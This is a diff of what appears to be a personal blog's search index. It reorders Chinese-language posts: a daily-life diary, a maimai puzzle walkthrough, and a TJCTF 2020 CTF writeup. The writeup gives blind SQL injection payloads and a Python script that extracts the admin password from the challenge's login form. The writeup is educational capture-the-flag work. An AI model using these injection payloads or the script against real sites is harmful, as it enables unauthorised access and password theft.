@@ -46,21 +46,6 @@
       </categories>
   </entry>
   <entry>
-    <title>【週記】一些日常生活漫談</title>
-    <url>/2019/190122-daily-talk/</url>
-    <content><![CDATA[<p><img src="https://pbs.twimg.com/media/Dw8dzwQUwAA5vZv.jpg:large"></p>
-<p>原定這週應該要發研所推甄心得的…不過出了一些事只能暫緩 QwQ<br>先放張最近19冬的熱門話題角色”三玖”，雖然聽說不少人追完漫畫就倒戈追二乃了www  </p>
-<a id="more"></a>
-<p>我自己只有追完動畫ep1，有點太閒魚了…不過單論人設來看，三玖給我的感覺：耳機、黑絲、歐派、無口(?)屬性加分不少，個性之類的細節等看看有沒有時間追漫畫吧(嘆)。</p>
-<p>咳咳、好像有點太油了。<br>來說說最近的生活吧，目前結束了大四上姑且算是平安活下來了XD<br>不過途中收到某間學校的一通臨時備取通知搞得我人仰馬翻，當時甚至還在FB小小地崩潰一下，事後想想其實也還好，頂多就不去嘛QQ 誰叫我有選擇、性障礙…  咳咳、我是說選擇性、障礙，嗯。<br>只是原本已經放下找教授的這件事，現在不得不又拿出來忙了(跪)。</p>
-<p>也因為這臨時的通知，很多行程都必須配合著提前規劃，導致我回到台北家的時間有點早…<br>嗯、待在家真的反而不太想去動電腦，偏偏剛回家又有點喉嚨發炎，所以都在睡覺 嘖</p>
-<p>下週會去參加台大辦的IOI camp，雖然感覺是去當砲灰der<br>（想想最近打Codeforces的Rating又在綠字 和 灰字之間遊走…有點擔心呢）<br>不過算算能好好玩競程的時間也不多了，希望可以吸收點新知識。<br>然而、第一天要教DP，呃啊真的是硬傷 QQ </p>
-]]></content>
-      <categories>
-        <category>生活札記</category>
-      </categories>
-  </entry>
-  <entry>
     <title>【週記】過新年就是要欠債對唄！</title>
     <url>/2019/190207-new-year-talk/</url>
     <content><![CDATA[<p><img src="https://imgur.com/DbAEQEE.jpg"></p>
@@ -76,6 +61,21 @@
 <li>NUKCPC: 一篇關於高大競程的文章，原定是IOI camp前要丟出來，結果就是因為某研所害我行程全部都卡住 嗚嗚QQ  </li>
 </ol>
 <p>大概就醬。<br>我還在摸索寫文章的風格，畢竟用Facebook久了在段落的排版上還是習慣一句話直接換行，看來要想個方法調整一下~ 努力還債囉ww</p>
+]]></content>
+      <categories>
+        <category>生活札記</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【週記】一些日常生活漫談</title>
+    <url>/2019/190122-daily-talk/</url>
+    <content><![CDATA[<p><img src="https://pbs.twimg.com/media/Dw8dzwQUwAA5vZv.jpg:large"></p>
+<p>原定這週應該要發研所推甄心得的…不過出了一些事只能暫緩 QwQ<br>先放張最近19冬的熱門話題角色”三玖”，雖然聽說不少人追完漫畫就倒戈追二乃了www  </p>
+<a id="more"></a>
+<p>我自己只有追完動畫ep1，有點太閒魚了…不過單論人設來看，三玖給我的感覺：耳機、黑絲、歐派、無口(?)屬性加分不少，個性之類的細節等看看有沒有時間追漫畫吧(嘆)。</p>
+<p>咳咳、好像有點太油了。<br>來說說最近的生活吧，目前結束了大四上姑且算是平安活下來了XD<br>不過途中收到某間學校的一通臨時備取通知搞得我人仰馬翻，當時甚至還在FB小小地崩潰一下，事後想想其實也還好，頂多就不去嘛QQ 誰叫我有選擇、性障礙…  咳咳、我是說選擇性、障礙，嗯。<br>只是原本已經放下找教授的這件事，現在不得不又拿出來忙了(跪)。</p>
+<p>也因為這臨時的通知，很多行程都必須配合著提前規劃，導致我回到台北家的時間有點早…<br>嗯、待在家真的反而不太想去動電腦，偏偏剛回家又有點喉嚨發炎，所以都在睡覺 嘖</p>
+<p>下週會去參加台大辦的IOI camp，雖然感覺是去當砲灰der<br>（想想最近打Codeforces的Rating又在綠字 和 灰字之間遊走…有點擔心呢）<br>不過算算能好好玩競程的時間也不多了，希望可以吸收點新知識。<br>然而、第一天要教DP，呃啊真的是硬傷 QQ </p>
 ]]></content>
       <categories>
         <category>生活札記</category>
@@ -214,95 +214,6 @@
       <tags>
         <tag>Programming Contest</tag>
         <tag>Codeforces</tag>
-        <tag>April Fools&#39; Day</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【活動】maimai愚人節解謎 &lt;怒槌～光吉猛修一部謎～&gt;</title>
-    <url>/2019/190402-maimai-april-fools-day/</url>
-    <content><![CDATA[<p><img src="https://i.imgur.com/Q8LRvq8.jpg"></p>
-<p>又到了一年一度的愚人節呢<br>網路上不免俗地充斥著各種假新聞（#<br>而maimai今年也照慣例推出愚人節相關活動，不過！這次多了解謎的彩蛋活動XD</p>
-<p>活動網址 ☛ <a href="https://chunithm.sega.jp/april-fool2019/">https://chunithm.sega.jp/april-fool2019/</a></p>
-<p>為了避免有爆雷捏他嫌疑，我還特地等到4/1過了才發這篇呢www</p>
-<a id="more"></a>
-
-<p>這次SEGA旗下的三款音樂遊戲機台 maimai、CHUNITHM、オンゲキ 都有相對應的愚人節活動。<br>只是無奈台灣只有maimai能玩，其餘兩台都是日本限定，殘念呀QQ</p>
-<p>不過換句話說… 解謎的負擔也相對減輕不少XD<br>畢竟我們不是日本人，這些需要用平仮名、片仮名來組合的謎題真的花了不少時間才搞懂…<br>別看下面解謎看起來很簡單、當初我們可是猜來猜去把兩張B5計算紙都寫滿了呢www</p>
-<p>首先、放上愚人節我們解謎用的youtube外部出力影片，而謎題就在背景動畫中。<br>我想應該是怕太早捏他吧，直到4/2才逐漸有解謎取向的解說影片。</p>
-<iframe width="560" height="315" src="https://www.youtube.com/embed/51ZLA-yhdWo" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-<p>從上面可以看出，譜面相當… 混亂(?)。<br>也因為很多該點該滑的沒有處理，所以當時解謎真的是用0.25倍重播慢慢看(#</p>
-<p>那麼 下面就來解謎囉!! w</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<hr>
-<center>  ○(￣﹏￣)○ ○(￣﹏￣)○ &nbsp;&nbsp;ネタ（捏他）分隔線&nbsp;&nbsp;○(￣﹏￣)○ ○(￣﹏￣)○ </center>
-
-<center><b>以下圖片來源均參考<a href"https://www.youtube.com/channel/UCT4yIf-FPYWjuhwo1H7zQTw">布魯諾</a>的外部出力、不得不說畫面真的處理得很好!!</b></center>
-
-<hr>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p><strong>第一問、「本物を順番に読め」</strong></p>
-<p>翻成中文大約是「找出本尊並依照順序讀」，如影片所見就是一大堆粉色的tap、hold交雜。<br>有些是真的要按的，但其他的都是背景動畫亂入，實在… 非常討厭 XD</p>
-<p>解謎方式是找出要按出來的 tap（本尊），如下圖所見。</p>
-<p><img src="https://i.imgur.com/A9PB4Sa.png"></p>
-<p>可以看到最後一顆還把周圍的仮名拿走、超壞www</p>
-<p>解出來的答案是「わからない」，捏他自maimai原創曲 <a href="https://www.youtube.com/watch?v=Dmak1NEfhLE">分からない</a></p>
-<p>&nbsp;</p>
-<p><strong>第二問、「正確になぞり出てくる金の文字を読め」</strong></p>
-<p>題意要我們注意的是「正確描繪出來的金色文字」，不得不說這題是我們卡關最久的。</p>
-<p>我們嘗試把背景動畫出現的金色色塊抄起來，但完全沒有任何頭緒…<br>頂多可以猜到是仮名部分偏旁，然後天真地把五十音表拿出來開始各種亂猜XDDDD<br>解不出來就直接跳過了，直到剩下第五問需要這題的答案才又回來看，大概看了半小時、放棄。</p>
-<p>最後看完網路上的題解真的傻眼www<br>原來所謂”金色文字”也包含slide滑完出現的<strong>Perfect</strong>，但我們解謎用的外部出力並沒有滑完(((#<br>剩下的解法就看下圖啦~ 真的各種想不到</p>
-<p><img src="https://i.imgur.com/YBiO7FV.png"></p>
-<p>最後一個字真的很壞<br>在slide的<strong>Perfect</strong>黃條結束才在背景動畫突然插進一個點…（還讓我不得不拆成兩張截圖w</p>
-<p>解出來的答案是「トパゾライト」，捏他自作曲家 t+pazolite<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^^^^^^^^ 這傢伙寫過不少可怕的BOSS曲</p>
-<p>&nbsp;</p>
-<p><strong>第三問、「同じ数字には同じ文字」</strong></p>
-<p>這題應該是我們寫最快的一題吧XDDD<br>題意大約是「把同樣的數字對應同樣的字母，然後把最後一句拼寫出來」。</p>
-<p>要說難點的話… 那就是背景動畫很很很很很很、很晃，布魯諾桑處理出來的影片就清楚很多~</p>
-<p><img src="https://i.imgur.com/8uvtXNR.png"></p>
-<p>把maimai的四種判定文字Perfect、Great、Good、Miss 填入就結束了www<br>解出來的答案是「desperete(デスパレイト)」，捏他自maimai原創曲 <a href="https://www.youtube.com/watch?v=kJF2iJcxeI8">デスパレイト</a></p>
-<p>&nbsp;</p>
-<p><strong>第四問、「囲われた文字を数字の順に読め」</strong></p>
-<p>這題一開始我還看不懂題目（日文苦手），後來才簡單查了一下<br>題意是「把圍起來的文字照數字順序讀」… 簡單XD</p>
-<p><img src="https://i.imgur.com/G7i27I0.png"></p>
-<p>解出來的答案是「せんたくき」，寫成漢字就是「洗濯機」 …應該不用另外解釋了吧www</p>
-<p>&nbsp;</p>
-<p><strong>最終問題、「流れ星を読め」</strong></p>
-<p>一大堆的 tap、slide、break、both，不難看出就是前四題作為題目的符號。<br>題意是「照著流星讀出來」，也不難猜出就是所謂的 slide，剩下…把字對齊就行了~</p>
-<p><img src="https://i.imgur.com/JusiEGk.png"></p>
-<p>由於背景動畫也是各種晃晃晃晃晃、倒帶看了不少次…</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;わから [な] い<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;とぱ [ぞ] らいと<br>ですぱれい [と]<br>&nbsp;&nbsp;&nbsp;&nbsp;せんたく [き]</p>
-<p>解出來的答案是「なぞとき」，寫成漢字為「謎解き」即本次活動主題~<br>當時只剩第二問解不出來還想硬猜這題，結果居然是濁音”ぞ”怎麼猜啦QQQ</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-<p>嗯？你以為結束了嗎… 並沒有！</p>
-<p>當你把上述五問的答案填入網站除了會得到一些頭像/底版/稱號，還會多拿到五張圖片= =</p>
-<p><img src="https://i.imgur.com/wRLqrgW.jpg"></p>
-<p>由左至右分別是第一問至最終問題，好像有種Dejavu(既視感)<br>… 沒錯！正是第一問列出來的八個仮名，把仮名照順序拼出來在網站中找到さらなる謎(MASTER)填入即可。</p>
-<p>解出來的答案是「ながいき」，寫成漢字為「長生き」（長命）<br>雖然是解出來，不過查了很久找不出捏他 QQ</p>
-<p>至此就差不多告一個段落、剩下的因為涉及CHUNITHM、オンゲキ 兩個玩不到的人權，只能放棄(#</p>
-<hr>
-<p>題外話 … 在解謎的過程中，在該網站上意外找到了source code的彩蛋XD</p>
-<p><img src="https://i.imgur.com/qDxZ1sm.png"></p>
-<p>ここにヒントはありませ（這裡沒有任何提示）。</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>笑死 ᕕ ( ᐛ ) ᕗ</p>
-]]></content>
-      <categories>
-        <category>休閒娛樂</category>
-      </categories>
-      <tags>
-        <tag>音Game</tag>
         <tag>April Fools&#39; Day</tag>
       </tags>
   </entry>
@@ -530,6 +441,95 @@
       </categories>
       <tags>
         <tag>日本行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【活動】maimai愚人節解謎 &lt;怒槌～光吉猛修一部謎～&gt;</title>
+    <url>/2019/190402-maimai-april-fools-day/</url>
+    <content><![CDATA[<p><img src="https://i.imgur.com/Q8LRvq8.jpg"></p>
+<p>又到了一年一度的愚人節呢<br>網路上不免俗地充斥著各種假新聞（#<br>而maimai今年也照慣例推出愚人節相關活動，不過！這次多了解謎的彩蛋活動XD</p>
+<p>活動網址 ☛ <a href="https://chunithm.sega.jp/april-fool2019/">https://chunithm.sega.jp/april-fool2019/</a></p>
+<p>為了避免有爆雷捏他嫌疑，我還特地等到4/1過了才發這篇呢www</p>
+<a id="more"></a>
+
+<p>這次SEGA旗下的三款音樂遊戲機台 maimai、CHUNITHM、オンゲキ 都有相對應的愚人節活動。<br>只是無奈台灣只有maimai能玩，其餘兩台都是日本限定，殘念呀QQ</p>
+<p>不過換句話說… 解謎的負擔也相對減輕不少XD<br>畢竟我們不是日本人，這些需要用平仮名、片仮名來組合的謎題真的花了不少時間才搞懂…<br>別看下面解謎看起來很簡單、當初我們可是猜來猜去把兩張B5計算紙都寫滿了呢www</p>
+<p>首先、放上愚人節我們解謎用的youtube外部出力影片，而謎題就在背景動畫中。<br>我想應該是怕太早捏他吧，直到4/2才逐漸有解謎取向的解說影片。</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/51ZLA-yhdWo" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+<p>從上面可以看出，譜面相當… 混亂(?)。<br>也因為很多該點該滑的沒有處理，所以當時解謎真的是用0.25倍重播慢慢看(#</p>
+<p>那麼 下面就來解謎囉!! w</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<hr>
+<center>  ○(￣﹏￣)○ ○(￣﹏￣)○ &nbsp;&nbsp;ネタ（捏他）分隔線&nbsp;&nbsp;○(￣﹏￣)○ ○(￣﹏￣)○ </center>
+
+<center><b>以下圖片來源均參考<a href"https://www.youtube.com/channel/UCT4yIf-FPYWjuhwo1H7zQTw">布魯諾</a>的外部出力、不得不說畫面真的處理得很好!!</b></center>
+
+<hr>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong>第一問、「本物を順番に読め」</strong></p>
+<p>翻成中文大約是「找出本尊並依照順序讀」，如影片所見就是一大堆粉色的tap、hold交雜。<br>有些是真的要按的，但其他的都是背景動畫亂入，實在… 非常討厭 XD</p>
+<p>解謎方式是找出要按出來的 tap（本尊），如下圖所見。</p>
+<p><img src="https://i.imgur.com/A9PB4Sa.png"></p>
+<p>可以看到最後一顆還把周圍的仮名拿走、超壞www</p>
+<p>解出來的答案是「わからない」，捏他自maimai原創曲 <a href="https://www.youtube.com/watch?v=Dmak1NEfhLE">分からない</a></p>
+<p>&nbsp;</p>
+<p><strong>第二問、「正確になぞり出てくる金の文字を読め」</strong></p>
+<p>題意要我們注意的是「正確描繪出來的金色文字」，不得不說這題是我們卡關最久的。</p>
+<p>我們嘗試把背景動畫出現的金色色塊抄起來，但完全沒有任何頭緒…<br>頂多可以猜到是仮名部分偏旁，然後天真地把五十音表拿出來開始各種亂猜XDDDD<br>解不出來就直接跳過了，直到剩下第五問需要這題的答案才又回來看，大概看了半小時、放棄。</p>
+<p>最後看完網路上的題解真的傻眼www<br>原來所謂”金色文字”也包含slide滑完出現的<strong>Perfect</strong>，但我們解謎用的外部出力並沒有滑完(((#<br>剩下的解法就看下圖啦~ 真的各種想不到</p>
+<p><img src="https://i.imgur.com/YBiO7FV.png"></p>
+<p>最後一個字真的很壞<br>在slide的<strong>Perfect</strong>黃條結束才在背景動畫突然插進一個點…（還讓我不得不拆成兩張截圖w</p>
+<p>解出來的答案是「トパゾライト」，捏他自作曲家 t+pazolite<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^^^^^^^^ 這傢伙寫過不少可怕的BOSS曲</p>
+<p>&nbsp;</p>
+<p><strong>第三問、「同じ数字には同じ文字」</strong></p>
+<p>這題應該是我們寫最快的一題吧XDDD<br>題意大約是「把同樣的數字對應同樣的字母，然後把最後一句拼寫出來」。</p>
+<p>要說難點的話… 那就是背景動畫很很很很很很、很晃，布魯諾桑處理出來的影片就清楚很多~</p>
+<p><img src="https://i.imgur.com/8uvtXNR.png"></p>
+<p>把maimai的四種判定文字Perfect、Great、Good、Miss 填入就結束了www<br>解出來的答案是「desperete(デスパレイト)」，捏他自maimai原創曲 <a href="https://www.youtube.com/watch?v=kJF2iJcxeI8">デスパレイト</a></p>
+<p>&nbsp;</p>
+<p><strong>第四問、「囲われた文字を数字の順に読め」</strong></p>
+<p>這題一開始我還看不懂題目（日文苦手），後來才簡單查了一下<br>題意是「把圍起來的文字照數字順序讀」… 簡單XD</p>
+<p><img src="https://i.imgur.com/G7i27I0.png"></p>
+<p>解出來的答案是「せんたくき」，寫成漢字就是「洗濯機」 …應該不用另外解釋了吧www</p>
+<p>&nbsp;</p>
+<p><strong>最終問題、「流れ星を読め」</strong></p>
+<p>一大堆的 tap、slide、break、both，不難看出就是前四題作為題目的符號。<br>題意是「照著流星讀出來」，也不難猜出就是所謂的 slide，剩下…把字對齊就行了~</p>
+<p><img src="https://i.imgur.com/JusiEGk.png"></p>
+<p>由於背景動畫也是各種晃晃晃晃晃、倒帶看了不少次…</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;わから [な] い<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;とぱ [ぞ] らいと<br>ですぱれい [と]<br>&nbsp;&nbsp;&nbsp;&nbsp;せんたく [き]</p>
+<p>解出來的答案是「なぞとき」，寫成漢字為「謎解き」即本次活動主題~<br>當時只剩第二問解不出來還想硬猜這題，結果居然是濁音”ぞ”怎麼猜啦QQQ</p>
+<p>.</p>
+<p>.</p>
+<p>.</p>
+<p>嗯？你以為結束了嗎… 並沒有！</p>
+<p>當你把上述五問的答案填入網站除了會得到一些頭像/底版/稱號，還會多拿到五張圖片= =</p>
+<p><img src="https://i.imgur.com/wRLqrgW.jpg"></p>
+<p>由左至右分別是第一問至最終問題，好像有種Dejavu(既視感)<br>… 沒錯！正是第一問列出來的八個仮名，把仮名照順序拼出來在網站中找到さらなる謎(MASTER)填入即可。</p>
+<p>解出來的答案是「ながいき」，寫成漢字為「長生き」（長命）<br>雖然是解出來，不過查了很久找不出捏他 QQ</p>
+<p>至此就差不多告一個段落、剩下的因為涉及CHUNITHM、オンゲキ 兩個玩不到的人權，只能放棄(#</p>
+<hr>
+<p>題外話 … 在解謎的過程中，在該網站上意外找到了source code的彩蛋XD</p>
+<p><img src="https://i.imgur.com/qDxZ1sm.png"></p>
+<p>ここにヒントはありませ（這裡沒有任何提示）。</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>笑死 ᕕ ( ᐛ ) ᕗ</p>
+]]></content>
+      <categories>
+        <category>休閒娛樂</category>
+      </categories>
+      <tags>
+        <tag>音Game</tag>
+        <tag>April Fools&#39; Day</tag>
       </tags>
   </entry>
   <entry>
@@ -1605,6 +1605,54 @@ Pwn大概就是這麼一回事了~
       </categories>
   </entry>
   <entry>
+    <title>TJCTF 2020 - Weak Password (Web)</title>
+    <url>/2020/200529-tjctf-weakpassword/</url>
+    <content><![CDATA[<p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/readme.md">MacacaHub TJCTF 2020 Writeups</a></p>
+<p>這題雖然叫Weak Password，但我當時遇到真的戳不出來呢 ; w ;</p>
+<p>最後賽後隊友提點才知道原來是<strong>Blind SQL injection</strong>，平常我只拿<code>&#39; or 1=1 -- </code>戳戳根本是小兒科ww</p>
+<a id="more"></a>
+
+<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>It seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this <a href="https://weak_password.tjctf.org/">site</a>. He’s told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{…})</p>
+<p><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true"></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>標題同樣為<strong>Weak Password</strong>，T貓盃只有<code>admin</code>:<code>admin</code>，這裡反而沒有這麼簡單XD</p>
+<p>從題目給定<code>username</code>為<code>admin</code>，以及從<code>source code</code>可以看到<code>SQL語法</code>以及一些欄位資訊，我們可以猜到這題要用<strong>Blind SQL injection</strong>，一些基本的猜法可以參考<a href="https://www.twblogs.net/a/5d0d7134bd9eee1ede0450b0">此篇</a>，當然也可以從網頁把<code>password</code>每個字元慢慢猜出來，但身為未來工程屍… 還是寫個Code吧 : )</p>
+<p><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/02.png?raw=true"></p>
+<p>How to Guess ?</p>
+<p>透過<code>SQL injection</code>並利用登入結果判斷是否成功，想辦法從<code>username</code>撈出我們想要的資訊。</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/03.png?raw=true"></div><div class="group-picture-column" style="width: 50%;"><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/04.png?raw=true"></div></div></div></div>
+
+<p>例如，猜<code>password</code>長度：</p>
+<p><code>admin&#39; and length(password) &gt; 13 -- </code> –&gt; success</p>
+<p><code>admin&#39; and length(password) &gt; 14 -- </code> –&gt; fail</p>
+<p><code>admin&#39; and length(password) = 14 -- </code> –&gt; success</p>
+<p>可以猜到<code>password</code>長度為14。<br><br></p>
+<p>又例如，猜<code>password</code>第一個字元：</p>
+<p><code>admin&#39; and unicode(substr(password, 1)) &gt; unicode(&#39;a&#39;) -- </code> –&gt; success</p>
+<p><code>admin&#39; and unicode(substr(password, 1)) &gt; unicode(&#39;b&#39;) -- </code> –&gt; fail</p>
+<p><code>admin&#39; and unicode(substr(password, 1)) = unicode(&#39;b&#39;) -- </code> –&gt; success</p>
+<p>可以猜到<code>password</code>第一個字元為<code>b</code>。</p>
+<br>
+再來就是寫Code了，可以搭配 **Binary search** 加速搜尋~
+
+<p>然後用回傳的request長度判斷結果是否成功。</p>
+<figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send request and get result</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span>(<span class="params">n, opr, char</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;https://weak_password.tjctf.org/login&#x27;</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and unicode(substr(password, &#123;&#125;)) \\</span></span><br><span class="line"><span class="string">    &#123;&#125; unicode(&#x27;&#123;&#125;&#x27;)-- &quot;</span>.format(n, opr,char), <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> len(r.text)==<span class="number">1842</span> <span class="keyword">else</span> <span class="literal">False</span> <span class="comment">#1842:success</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">li = list(string.digits + string.ascii_lowercase)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    </span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = len(li) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># end up binary search if it can&#x27;t checkout any character</span></span><br><span class="line">    <span class="keyword">if</span> inject(i, <span class="string">&#x27;&gt;&#x27;</span>, li[<span class="number">0</span>]) == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&#x27;password: &#x27;</span>+res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        mid = (l +(r+<span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#print(l, r, mid)</span></span><br><span class="line">        <span class="keyword">if</span> inject(i, <span class="string">&#x27;=&#x27;</span>, li[mid]):</span><br><span class="line">            res = res + li[mid]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> inject(i, <span class="string">&#x27;&gt;&#x27;</span>, li[mid]):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">elif</span> inject(i, <span class="string">&#x27;&lt;&#x27;</span>, li[mid]):</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/05.png?raw=true" width="500" align="center"/>
+
+<blockquote>
+<p>tjctf{blindsqli14519}</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>TJCTF 2020</tag>
+        <tag>Web Challenge</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>さようなら、大江戶。</title>
     <url>/2020/200426-goodbye-dajianhu/</url>
     <content><![CDATA[<p><img src="https://photos.smugmug.com/photos/i-BLcP568/1/b2866b7d/L/i-BLcP568-L.jpg?70%25"><br>大江戶要消失了了了嗚嗚不要啦啦啦啦啦，這個陪我度過大學時期無數打ㄐ夜晚的家。<br>消息實在是來得突然，前陣子知道美奇萊大概會撐到年底… 結果大江戶過幾天直接公告週末要撤QwQ<br>不過這也讓很多許久不見的老朋友回來踩最後一次ㄋ ~ 宛如一場小型告別式!!</p>
@@ -1681,54 +1729,6 @@ Pwn大概就是這麼一回事了~
       </categories>
       <tags>
         <tag>音Game</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TJCTF 2020 - Weak Password (Web)</title>
-    <url>/2020/200529-tjctf-weakpassword/</url>
-    <content><![CDATA[<p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/readme.md">MacacaHub TJCTF 2020 Writeups</a></p>
-<p>這題雖然叫Weak Password，但我當時遇到真的戳不出來呢 ; w ;</p>
-<p>最後賽後隊友提點才知道原來是<strong>Blind SQL injection</strong>，平常我只拿<code>&#39; or 1=1 -- </code>戳戳根本是小兒科ww</p>
-<a id="more"></a>
-
-<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>It seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this <a href="https://weak_password.tjctf.org/">site</a>. He’s told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{…})</p>
-<p><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true"></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>標題同樣為<strong>Weak Password</strong>，T貓盃只有<code>admin</code>:<code>admin</code>，這裡反而沒有這麼簡單XD</p>
-<p>從題目給定<code>username</code>為<code>admin</code>，以及從<code>source code</code>可以看到<code>SQL語法</code>以及一些欄位資訊，我們可以猜到這題要用<strong>Blind SQL injection</strong>，一些基本的猜法可以參考<a href="https://www.twblogs.net/a/5d0d7134bd9eee1ede0450b0">此篇</a>，當然也可以從網頁把<code>password</code>每個字元慢慢猜出來，但身為未來工程屍… 還是寫個Code吧 : )</p>
-<p><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/02.png?raw=true"></p>
-<p>How to Guess ?</p>
-<p>透過<code>SQL injection</code>並利用登入結果判斷是否成功，想辦法從<code>username</code>撈出我們想要的資訊。</p>
